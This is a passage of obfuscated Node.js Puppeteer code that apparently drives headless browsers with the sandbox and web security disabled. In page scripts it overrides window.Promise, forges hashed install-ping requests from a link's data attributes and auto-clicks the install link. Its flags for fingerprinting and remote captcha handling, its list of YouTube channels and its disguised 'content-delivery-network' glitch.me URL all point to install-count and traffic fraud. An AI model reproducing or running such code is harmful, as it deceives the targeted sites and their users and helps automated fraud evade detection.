-0x2057 + -0x272 * -0x9 + 0x2a5 * 0x4 & L) << y[0x19a3 * -0x1 + -0x3 * 0xcba + 0x5f * 0xac & N++]) : (L = 0x956 * 0x14 + 0xf804 + 0xf6 * -0xba + ((-0x1e20 + -0x79c + -0x3 * -0xde9 & L) << -0x5 * 0x15e + 0xa90 + 0x3b0 * -0x1 | -0x3b * 0x17 + -0x19b1 + 0x22fd & J['charCodeAt'](++M)), P[N >> -0x5a * 0x3e + -0x174e * 0x1 + 0x2d1c] |= (0x5ce * -0x3 + 0x54a + 0xd10 | L >> 0x1 * -0x1a12 + 0x17d * -0x6 + -0x1189 * -0x2) << y[-0x2488 + 0x1 * 0x1b87 + 0x482 * 0x2 & N++], P[N >> 0x18 * 0x8 + -0x11de + 0x1120] |= (-0xd07 + 0xee * 0x7 + -0x257 * -0x3 | L >> -0x57 + -0x1dad + 0x1e10 & 0x1 * -0x920 + 0x1 * -0xc73 + 0x93 * 0x26) << y[-0xe57 + -0x5ec + 0x1446 & N++], P[N >> -0x5a0 * 0x5 + 0x1 * 0x1231 + 0x9f1] |= (0x454 * -0x2 + -0x72b + 0x1053 | L >> -0x1634 + 0xf3b + 0x6ff & 0x1532 + 0xc09 + -0x20fc) << y[0xa3e * 0x2 + 0x2f * 0x62 + -0x2b * 0xe5 & N++], P[N >> -0x1d3 * -0x7 + 0x2207 + -0x2eca] |= (0x1d7 * -0xa + -0x179 * 0x15 + 0x31d3 | -0x5b5 + -0x1 * 0x54a + 0x59f * 0x2 & L) << y[0x1 * -0x27d + 0x4 * 0xec + -0x130 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x23f * -0x9 + -0x1 * -0x19c9 + -0x552 ? (this['block'] = P[-0x1ffa * -0x1 + -0x1aee + 0x16 * -0x3a], this['start'] = N - (0x4aa + 0xd48 + 0x38a * -0x5), this['hash'](), this['hashed'] = 0x1 * 0x19ec + 0x17d9 + -0x31c4) : this['start'] = N;
                }
                return this['bytes'] > 0x1 * 0x147a84367 + -0x15b7e618f + 0x113d61e27 && (this['hBytes'] += this['bytes'] / (-0x1 * -0x88dbc04 + -0xf6a171e0 + 0x1ee13b5dc) << -0x4fc + 0xad4 + 0xbb * -0x8, this['bytes'] = this['bytes'] % (-0x6db492d4 + -0x8c2e * -0x1186 + -0xa280c * -0x2310)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x4c4 + -0x27f * -0x7 + -0x163c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x373 * -0x7 + 0xdb0 + 0x36f * -0xb] = this['block'], J[K >> -0x831 * -0x1 + -0x538 + -0x2f7] |= x[0xcf8 + -0xf45 + 0x250 & K], this['block'] = J[0x17f0 + -0x1951 + 0x171], K >= 0xe0c + 0x10c * -0xd + -0x38 && (this['hashed'] || this['hash'](), J[-0x13a9 + -0x9e5 + -0x4ed * -0x6] = this['block'], J[0x20 * -0x3b + 0x1bba + -0x6a * 0x31] = J[0xde7 * 0x2 + -0x2150 + -0x11 * -0x53] = J[-0x7 * -0x3fe + 0x2 * 0x1296 + -0x411c] = J[0x21ac + -0x26bc + 0x513] = J[-0x1a17 + 0x1d * 0x9 + -0xf7 * -0x1a] = J[0xefb + 0x15f7 + -0x24ed * 0x1] = J[0x11c7 + -0xc6f + -0x6 * 0xe3] = J[-0x1 * 0xab6 + 0x1359 + -0x89c] = J[-0x2 * -0xe8a + 0x1cde + 0x6 * -0x9a7] = J[-0x71 * -0x3b + -0x8 * -0x131 + -0x238a] = J[0x1deb + -0x1721 + -0xd8 * 0x8] = J[0x1b * -0xb + -0x142 * -0x4 + -0x3d4] = J[0xb0 * 0x21 + 0x146 * -0x1a + 0xa78] = J[-0x1 * -0x16d4 + 0x1 * 0x1b1e + -0xf1 * 0x35] = J[0x1f20 + -0x1 * -0x221d + -0x412f] = J[0x201b * -0x1 + 0x1 * 0x157 + 0x25f * 0xd] = 0x1717 * 0x1 + -0x2 * 0xf8d + 0x803 * 0x1), J[0x251e + 0x971 + 0x1 * -0x2e81] = this['hBytes'] << 0xbe7 + 0x10b8 + -0x1c9c | this['bytes'] >>> -0x18d8 + 0x1d5a + -0x2d * 0x19, J[0x4f8 + -0x40 * -0x68 + -0x1ee9] = this['bytes'] << 0x337 + 0x5 * -0x5 + -0x31b, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x12 * 0x64 + -0xf19 + 0x1 * 0x821; J < 0x2fa + 0x1 * 0x76f + 0x5 * -0x205; ++J)
                K = Q[J - (-0x23 * -0xe2 + 0x11 * 0xf7 + 0x2f4a * -0x1)] ^ Q[J - (-0x13b * 0xd + -0x1b59 + 0x10 * 0x2b6)] ^ Q[J - (0x3 * -0x3f + -0x2 * 0x3e + 0x147)] ^ Q[J - (-0x39 * 0x85 + -0x11b9 * -0x2 + -0x5c5 * 0x1)], Q[J] = K << -0x69 * 0x4e + -0x262e + 0x462d | K >>> 0x1685 * 0x1 + 0x213 + 0x1879 * -0x1;
              for (J = -0x1f43 + 0x8ea * 0x2 + 0xd6f; J < -0x3e * -0x99 + 0x76 * 0x1d + 0x192c * -0x2; J += 0x12de + 0xf5c + -0x7 * 0x4e3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x21d1 + -0x840 + -0x150b * -0x2 | L >>> 0x23e * 0x11 + 0x130a + -0x390d) + (M & N | ~M & O) + P + (-0x6b196333 + 0x1cf * -0x5f03bf + 0x17173a33d) + Q[J] << -0x2343 + -0xd * -0xad + 0x1a7a) << 0x9dc + 0xf8 + -0xacf | P >>> -0x1754 + 0x1 * -0xb4b + 0x23 * 0xfe) + (L & (M = M << -0x49b + 0x1633 * 0x1 + -0x8bd * 0x2 | M >>> 0x18f * -0xe + 0x657 + -0xf7d * -0x1) | ~L & N) + O + (0x137 * 0x50a464 + 0x2cf904be + 0x1325b5 * -0x2bd) + Q[J + (-0x109a + 0x23 * 0x1f + -0x2 * -0x62f)] << 0x44 * -0x1 + -0x25 * -0x9 + -0x109) << -0x1 * 0x33f + -0x16 * -0x4f + 0x16 * -0x29 | O >>> -0x4d + -0x245e * -0x1 + -0x11fb * 0x2) + (P & (L = L << -0x1a4d + -0xd95 + -0x80 * -0x50 | L >>> -0x26fb + 0x1f11 * -0x1 + 0x460e) | ~P & M) + N + (0x7c063449 + 0x17746069 + -0x38f81b19) + Q[J + (0x25 * 0x99 + -0xd79 + -0xaa * 0xd)] << -0x986 + -0x15f * -0xd + 0x11 * -0x7d) << 0x1055 * 0x1 + 0xb5 * 0x2a + -0x2e02 | N >>> 0x2100 + 0x1f18 + 0x3ffd * -0x1) + (O & (P = P << -0xc86 * 0x3 + -0x1 * -0x2d1 + 0x4f * 0x71 | P >>> 0xc6e * 0x1 + 0x6 * 0x5ce + -0x2f40) | ~O & L) + M + (0xe95 * 0xc3341 + -0x38 * 0x3317096 + 0x5b6bb794) + Q[J + (0x1 * -0xaf + 0x17f2 + -0x1740)] << -0xb55 + -0x96f * 0x3 + 0x27a2) << -0xc * 0x81 + 0x1ed3 + -0xc61 * 0x2 | M >>> -0x45e * -0x6 + -0x1 * -0x2561 + -0x82 * 0x7d) + (N & (O = O << -0x88a + -0x1 * -0x332 + -0x6 * -0xe9 | O >>> -0x10b5 + -0x257e + 0x3635 * 0x1) | ~N & P) + L + (-0x7d91287 * 0x7 + 0x8527d0e0 + 0xc4a2a6a) + Q[J + (-0x8 * -0x116 + -0xb4c + -0x3 * -0xe0)] << 0x1 * -0x2393 + 0x98c + 0x1a07, N = N << 0x737 * -0x3 + 0x3 * 0x598 + 0x5 * 0xff | N >>> 0x23ce + -0x7 * 0x48b + -0x3ff;
              for (; J < 0x11cf + 0x2 * 0x6f9 + -0x1f99; J += -0x17ea + 0x25bf + -0xdd0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1734 + -0x10e5 + 0xe6 * -0x7 | L >>> 0x626 * 0x1 + 0x1 * 0xb7b + -0x1186) + (M ^ N ^ O) + P + (-0xc9cd62d1 + -0x7ce3e48 * 0xa + 0x186b5bd42 * 0x1) + Q[J] << 0x1 * 0x25ab + -0x1f15 + 0x119 * -0x6) << -0x4e0 + -0x794 + -0x1f * -0x67 | P >>> -0x125 * 0x1d + -0x235a + 0x44a6) + (L ^ (M = M << 0x20b8 + -0x1 * -0x1e9f + -0x3f39 | M >>> 0x9a3 * -0x3 + 0x1 * 0xb83 + 0x1168) ^ N) + O + (-0xbdc4b * -0xe3f + 0x793fcf5 + 0x3 * -0x15e5cb43) + Q[J + (0x2e3 * -0x3 + -0x1c6 * -0x1 + 0x6e4)] << -0x1 * 0x249e + -0x5 * -0x119 + -0x1 * -0x1f21) << 0xb * -0x1 + -0x3 * 0x9c2 + 0x1d56 | O >>> -0x199 * 0xc + -0x983 * 0x1 + 0x1cca) + (P ^ (L = L << -0x1 * -0xc92 + 0x3 * 0x2f8 + -0x155c | L >>> 0x1 * 0xa43 + 0x90c + -0x134d) ^ M) + N + (-0x3ea5f14c * 0x3 + 0x25c67dde + -0x1 * -0x1050541a7) + Q[J + (0x283 + -0xb * -0x18d + -0x10 * 0x139)] << -0x1377 + -0x113 * -0xe + 0x46d) << 0xe * -0x1d9 + -0xe65 + 0x509 * 0x8 | N >>> -0x44 * -0x2e + 0xc0 * -0x2 + 0x13 * -0x8f) + (O ^ (P = P << 0x13 * -0xf0 + -0x1a * -0x41 + 0xb54 | P >>> 0xd * -0x22f + -0x1583 + 0x4 * 0xc7a) ^ L) + M + (0x1 * -0x70f129f4 + 0x6d139208 + 0x72b7838d) + Q[J + (-0xc4b + 0xb * 0xe1 + 0x5 * 0x87)] << 0x1f2 * 0x3 + 0xe84 * 0x2 + -0x22de) << -0x1 * 0x1e61 + -0x1f1f + 0x3d85 | M >>> 0x2582 + -0xb * 0x75 + -0x4 * 0x818) + (N ^ (O = O << 0x13cc + 0x1adc + -0x2e8a | O >>> -0x8fc * 0x3 + -0x22ae + -0xf * -0x41c) ^ P) + L + (-0x828b5f * -0x49 + -0xac86d * 0x73b + 0x979759a9 * 0x1) + Q[J + (-0x1 * -0x399 + -0x5 * -0x1e7 + -0xd18)] << -0x29 * 0xb7 + 0x223a + -0x1 * 0x4eb, N = N << 0x253d + -0xd39 + 0xe * -0x1b5 | N >>> -0xd9e + -0x99b + 0x173b;
              for (; J < 0xf93 + -0x949 + -0x60e; J += 0x43 * -0x7e + 0x1181 + 0xf7e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3 * -0xa4d + 0x13 * -0x1cf + 0x26b * 0x1b | L >>> 0x1c7 + -0x4b * -0xa + -0x49a) + (M & N | M & O | N & O) + P - (0x10b38c36 + 0x1 * 0x4abb9033 + 0x157526bb) + Q[J] << -0x7ba + 0x203b + 0x99 * -0x29) << -0xb7a + 0x3b * 0xa + 0x931 | P >>> -0xe87 * -0x1 + -0x1f7d + 0x1111) + (L & (M = M << -0x2453 + -0x1e26 + -0x1 * -0x4297 | M >>> -0x1cb0 + 0x1418 * -0x1 + 0x30ca) | L & N | M & N) + O - (-0x3 * 0xb0ae8db + -0xc536a09e + 0x1573b9e53) + Q[J + (-0x8 * 0x4b4 + -0x1459 * -0x1 + 0x1148 * 0x1)] << -0x26c9 + -0x1e2b + 0x3 * 0x16fc) << -0x13 * 0x183 + 0x47f * 0x2 + 0x9e * 0x20 | O >>> -0x1ffc + 0x1 * -0x1d19 + 0x3d30) + (P & (L = L << 0x2b4 + -0x1711 * -0x1 + -0x21 * 0xc7 | L >>> -0x280 * -0xe + -0x7dd + -0x1b21) | P & M | L & M) + N - (0xa20801b * -0x11 + 0x58f4e6 * 0x43 + 0x6d * 0x266cb91) + Q[J + (0x1eaa + 0x98d + -0xdb * 0x2f)] << -0x1223 + -0x189 + 0x13ac) << -0x83 * -0x5 + 0x1bf * -0x14 + 0x2062 | N >>> 0x27 * -0x86 + -0xb7d + 0x2 * 0x1001) + (O & (P = P << 0x251c + -0x2439 * -0x1 + -0x1 * 0x4937 | P >>> -0x141b + 0x68e * 0x3 + -0x17 * -0x5) | O & L | P & L) + M - (-0x4ed13369 + 0x477 * -0x2a3d49 + 0x17c4d177c) + Q[J + (0x1974 + -0x218 * 0x2 + -0x1541)] << 0x237d + -0x1507 + -0x4d2 * 0x3) << 0x1 * 0x1616 + -0x1 * -0x4ea + -0x1afb | M >>> 0x2264 + 0x2ef * 0x6 + 0x167 * -0x25) + (N & (O = O << -0xeae * 0x1 + -0x227b + 0x3147 | O >>> -0x1 * -0x26b + -0x1 * -0x247f + 0x9ba * -0x4) | N & P | O & P) + L - (-0x4f2e1ad1 + 0xab0 * 0x99001 + 0x59df5345) + Q[J + (0xf28 + -0x3 * -0xad1 + -0x2f97)] << -0x146 + 0xa93 * -0x2 + -0x4 * -0x59b, N = N << -0x5 * -0x499 + -0x232f * -0x1 + 0x9ad * -0x6 | N >>> 0x1402 + -0x2 * 0x43f + -0xb82;
              for (; J < 0x1e * -0xc3 + -0x1 * -0x189b + 0x3 * -0x7b; J += -0x1aa9 + -0x1a18 + 0x5 * 0xa8e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xd99 * 0x1 + -0xc * 0x1f + 0x506 * 0x3 | L >>> 0x184d + -0x17 * 0x52 + -0x2ce * 0x6) + (M ^ N ^ O) + P - (-0xeb085b3 * -0x1 + 0x4fae827c + -0x28c1ca05) + Q[J] << 0xe10 + -0x545 + -0x8cb) << 0x1ffe + 0x132e + -0x3327 | P >>> 0x13ac + -0x1d76 + -0x1 * -0x9e5) + (L ^ (M = M << 0xedd * 0x1 + 0x2 * -0xac + -0x2f * 0x49 | M >>> 0x124f + 0x977 * -0x4 + 0x3 * 0x685) ^ N) + O - (-0x26bce5f2 + -0x438fe354 + 0x9fea0770) + Q[J + (-0xed * 0x4 + -0x795 + -0x1 * -0xb4a)] << -0xe7c * -0x1 + -0xf73 + 0xf7) << 0x1431 + -0x26a6 * 0x1 + 0x127a | O >>> 0x1 * 0x1dbe + -0x115 + 0x56 * -0x55) + (P ^ (L = L << 0xbe7 + -0x3 * 0x1f5 + -0x5ea | L >>> 0x1 * 0x65b + 0x1 * -0x13bf + 0xd66) ^ M) + N - (-0x2e * 0x1fbf123 + 0x2faf64d4 + -0xc2665b4 * -0x8) + Q[J + (-0x167a + -0x1a3 + 0x5f * 0x41)] << 0xc1f * -0x1 + 0x84a + 0x3d5) << -0x156a + -0x5 * 0x1d3 + 0x1e8e | N >>> 0x1738 + 0x1c05 + 0xe * -0x3a7) + (O ^ (P = P << -0x61 * 0x4b + 0x329 * 0x7 + 0x66a | P >>> -0x1 * -0x19c7 + 0x22 * -0x41 + -0x1123) ^ L) + M - (0x2f * 0x826a9d + 0x41f236 * 0xb5 + -0x44d47 * 0x3f1) + Q[J + (0xa9e + -0x519 * -0x1 + 0x14f * -0xc)] << 0x1d36 + 0x1 * 0x416 + -0x853 * 0x4) << 0x1a * 0x133 + -0x1693 * -0x1 + 0x4c * -0xb5 | M >>> -0xf39 * 0x2 + -0x1 * -0x1d63 + 0x12a * 0x1) + (N ^ (O = O << -0x197 + 0x58b + -0x3d6 | O >>> 0x9d * 0x9 + 0x3 * 0x86a + -0x1ec1) ^ P) + L - (-0x43ad1da8 + -0x23192fa0 + 0x9c638b72) + Q[J + (-0x18d3 + -0x1c59 + 0x5c * 0x94)] << 0x24a + 0x158c + -0x17d6, N = N << 0x9d + 0xe * 0x1d7 + -0x1a41 | N >>> 0x11d + 0x11f6 + 0x1311 * -0x1;
              this['h0'] = this['h0'] + L << -0x1e49 + -0xb9e + -0x11 * -0x277, this['h1'] = this['h1'] + M << -0x9a + -0x1 * 0x16f + -0x1 * -0x209, this['h2'] = this['h2'] + N << -0x20 * 0xe7 + 0x469 + -0x1 * -0x1877, this['h3'] = this['h3'] + O << -0x12 * -0x46 + -0x213c + 0x1c5 * 0x10, this['h4'] = this['h4'] + P << 0x1 * -0xaff + -0x30 * -0x3 + 0xa6f;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1 * 0x120d + 0x2393 + -0x116a & 0x11a9 + -0x146b * -0x1 + -0x2605] + w[J >> 0x4c5 + -0x2 * -0x48b + -0xdc3 & -0x60 * -0x53 + -0x1021 + -0xef0] + w[J >> 0x1 * 0x1277 + -0x2 * -0xb37 + 0x2b * -0xf3 & 0xeb6 + 0x45 * -0x7 + -0xcc4] + w[J >> -0x3 * -0x15b + -0x31 * -0x3d + -0xfae & -0x175d + 0x489 + 0x12e3] + w[J >> 0x511 * 0x1 + 0x1 * 0x82d + 0x2 * -0x699 & 0x9e5 + 0x3f * 0x65 + 0x22b1 * -0x1] + w[J >> -0x1664 + 0x45b + 0x1211 & -0x110a + -0xe96 + 0x1faf] + w[J >> -0x21f4 + 0x141 * -0x8 + -0x160 * -0x20 & 0x16a * 0x2 + -0x1 * -0x13a2 + -0x1667] + w[0x1f93 + 0x2e * 0x95 + -0x3a4a & J] + w[K >> 0x1c1 + -0x2517 + -0x11b9 * -0x2 & 0x1 * -0x245f + 0xbb5 + 0x18b9] + w[K >> -0x5d8 + -0xd1e + 0x130e & 0xbf * -0x2 + 0x1f2a * 0x1 + -0x1d9d] + w[K >> 0x25d5 + 0x1d33 + -0x217a * 0x2 & 0x1 * 0x1c3a + 0x1 * 0xbe6 + -0x27 * 0x107] + w[K >> -0x2542 * -0x1 + 0x11df * 0x1 + -0x125b * 0x3 & -0x4 * -0x999 + 0x1c20 + -0x1 * 0x4275] + w[K >> -0x4 * 0x21 + 0xee8 + 0x44 * -0x36 & -0x2e3 * -0x5 + 0x24af + -0x1 * 0x330f] + w[K >> -0x1aa1 + -0x95 * 0x1 + 0x1b3e & 0x239c + 0x1788 + -0x3b15] + w[K >> 0x332 * -0x5 + -0x123 * 0x1 + 0x1121 & -0x14ba + 0x1c02 + -0x739] + w[-0x1 * 0x1904 + 0x26b + 0x16a8 & K] + w[L >> 0x3 * 0x7fe + -0x18f1 + 0x37 * 0x5 & 0x1e * 0xe5 + -0x129 * 0xb + 0x8a * -0x1a] + w[L >> -0x1749 * -0x1 + -0x23f3 * -0x1 + -0x3b24 & 0x1f02 * 0x1 + -0x538 * 0x5 + -0x4db] + w[L >> 0x110 + -0x568 * 0x4 + 0x529 * 0x4 & 0x1 * 0x117a + 0x97 * 0x3b + -0x1168 * 0x3] + w[L >> -0xf94 + 0x1 * 0xb89 + 0x41b * 0x1 & 0x12c * 0x7 + -0x17cb + 0x1 * 0xfa6] + w[L >> 0x2 * 0x3b9 + -0x1 * -0x1cfd + -0x1 * 0x2463 & -0x2 * 0x1cc + 0x15c1 * 0x1 + -0x121a] + w[L >> -0x198 + 0x21ee + -0x1 * 0x204e & -0x2665 + 0x756 + -0x2 * -0xf8f] + w[L >> 0xb7 * -0x15 + -0x20fa + 0x1 * 0x3001 & -0x1296 + -0x71 * 0x3c + 0x2d21] + w[-0x128a + 0x177 * -0xf + 0x482 * 0x9 & L] + w[M >> 0x6 * -0x12d + -0x124 + 0x84e & -0xd * 0xd + -0x1 * -0xfa9 + -0xef1] + w[M >> -0x2 * 0x75c + 0x1 * 0x3c4 + 0x2 * 0x586 & -0xc * 0xb2 + -0x22dc + -0x5 * -0x8a7] + w[M >> 0x1 * 0x579 + -0x18d5 + -0x26e * -0x8 & 0x3 * -0x3a1 + -0x3b9 + -0x5 * -0x2ef] + w[M >> -0x1e86 * 0x1 + 0xac1 + -0x1 * -0x13d5 & -0xc4e + 0x503 * 0x3 + 0x4 * -0xab] + w[M >> -0x67d + 0x10fd + -0xa74 & 0x2e6 * -0x3 + 0x1e3a + -0x1 * 0x1579] + w[M >> 0x24b * 0x1 + 0x28c * 0x3 + -0x9e7 & 0x1 * -0x143f + 0x22e5 * -0x1 + 0x3733] + w[M >> -0x1b44 + 0x1092 + 0xab6 & -0x1ea3 + -0x11 * -0x135 + 0xa2d * 0x1] + w[0xdff + 0x9e8 + -0x17d8 & M] + w[N >> 0x1 * 0xb2a + 0xaa * -0x11 + -0x3 * -0x14 & -0x3 * 0xa45 + -0x3e9 * -0x4 + 0xf3a] + w[N >> 0x452 + 0x263c + -0x153b * 0x2 & -0x107a + -0x1 * -0x617 + 0x539 * 0x2] + w[N >> -0x1 * 0x2186 + 0x164c + 0xb4e & 0x8 * 0x93 + 0x29 * -0x9e + 0x14c5 * 0x1] + w[N >> -0x1879 * -0x1 + 0xe1f + -0x2688 & -0x569 * 0x7 + 0xb08 + 0x1ae6] + w[N >> 0x1dfb + 0x1ca4 + -0x3a93 & -0x11c * 0x4 + 0x1 * -0x81d + 0xc9c] + w[N >> 0xd11 * 0x1 + -0x134b + 0x642 & 0x25d9 + -0x1cdd + -0x8ed] + w[N >> -0x6c + -0x6b * -0x31 + 0x2dd * -0x7 & 0xa62 * -0x2 + 0x218d + -0xcba] + w[-0x6 * 0x382 + 0x97c * -0x2 + 0x2813 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x2b9 * -0xd + -0x213d + -0xc * 0x2c & -0x2 * -0xf1b + -0x63 * 0x37 + -0x7f2,
                J >> -0x1 * -0x147d + -0x1bdd + 0x770 & -0xea * 0x1d + 0x16 * 0x14f + -0x149,
                J >> 0xc46 + 0x20fc + -0x2d3a & -0xc * -0x1c + 0x1787 + -0x17d8,
                -0xdab + -0x6f * -0x13 + 0x2f * 0x23 & J,
                K >> -0xca6 * -0x1 + -0x1 * 0x22e9 + 0x165b & 0x40a + -0xff1 + -0xfe * -0xd,
                K >> 0x338 + -0x1bfa + 0x18d2 & -0x2 * 0x66 + -0x9 * 0x3d5 + 0x2448,
                K >> -0x1 * -0x205 + -0xcaf + -0x4a * -0x25 & -0x347 + -0xa * -0xa4 + -0x222,
                -0xe48 + -0x65 * -0x2 + -0x1 * -0xe7d & K,
                L >> 0x1d8f * 0x1 + -0x2256 + 0x4df & -0x24f7 + 0x1 * -0xac7 + 0x103f * 0x3,
                L >> -0xd15 + -0x1f96 + 0x1 * 0x2cbb & 0x26c0 + 0x1 * -0x174b + -0x1 * 0xe76,
                L >> -0x2a3 + -0x1 * 0x2295 + 0x2540 & 0x1dea * -0x1 + -0x25a3 + -0x2 * -0x2246,
                0x3e + -0x1 * -0x481 + -0x28 * 0x18 & L,
                M >> -0x3e2 * -0x3 + 0x379 + -0xf07 & -0x1d3c + -0x1 * -0x1dd1 + 0x6a,
                M >> -0x1 * -0x1aa5 + -0x638 + -0x145d & -0x289 + -0x46 * 0x4f + 0x1922,
                M >> -0x10bf + 0x1356 + -0x83 * 0x5 & -0x195a + 0x1 * -0x182b + 0x3284,
                -0x138 + 0x1631 + -0x13fa & M,
                N >> -0x226e + -0x3 * -0xd5 + 0x2007 & 0x1e89 + 0x141e + 0x1 * -0x31a8,
                N >> -0xcb7 + -0x5f + 0x1 * 0xd26 & -0x279 * 0x2 + -0x1 * 0x185e + 0x1 * 0x1e4f,
                N >> 0x17 * -0x1ad + 0x1 * -0x2203 + 0x4896 & -0x508 + -0x2cd * 0x3 + 0xe6e,
                -0x382 * -0x4 + 0x22d2 + -0x2fdb * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xcb5 * -0x1 + -0x99f * 0x1 + -0x1de * -0xc), (K = new DataView(J))['setUint32'](0x27 * 0xc9 + 0x262b + -0x5 * 0xdc2, this['h0']), K['setUint32'](-0x1879 + -0x1389 * -0x1 + 0x4f4, this['h1']), K['setUint32'](-0x41e * -0x1 + -0x55 * 0x7 + -0x1c3 * 0x1, this['h2']), K['setUint32'](-0x1d * 0x131 + -0x6 * -0xbc + 0x1e31, this['h3']), K['setUint32'](-0x7 * 0x50b + -0x3b0 + 0x270d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x19ea + 0x23f1 + -0xa07 * 0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x71 * 0x18 + 0x18b3 + -0x234b;
            J[0x7 * -0xe5 + 0x50 * -0x2b + -0x691 * -0x3]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x2c9 * -0x5 + 0x12 * 0xc + 0xd15] = L => {
              const Z = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + Z(0x12)) + encodeURIComponent(N), 0x1 * -0x30b + -0x299 + -0x5 * -0x121), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1211 + -0x242 + -0xa2a * -0x2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x18aa + 0x2257 * 0x1 + -0x3525), Promise['resolve'](0x2 * 0xedc + 0x21f0 * -0x1 + 0x439);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1ee9 + -0x2610 + 0x44f9; j < 0x2239 * -0x1 + 0x2e * 0x1 + 0x220c * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x3b29 + -0x2eb1 + 0x12c8 + (-0x1a1a + 0xa8 * 0xa + 0x1 * 0x1f42) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x3 * -0x5d1 + 0x16d4 + -0xe5 * 0x6) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    a0(0xc, '#Bs4') + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x25c9 * -0x1 + 0x4c3 + 0x7 * -0x614; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
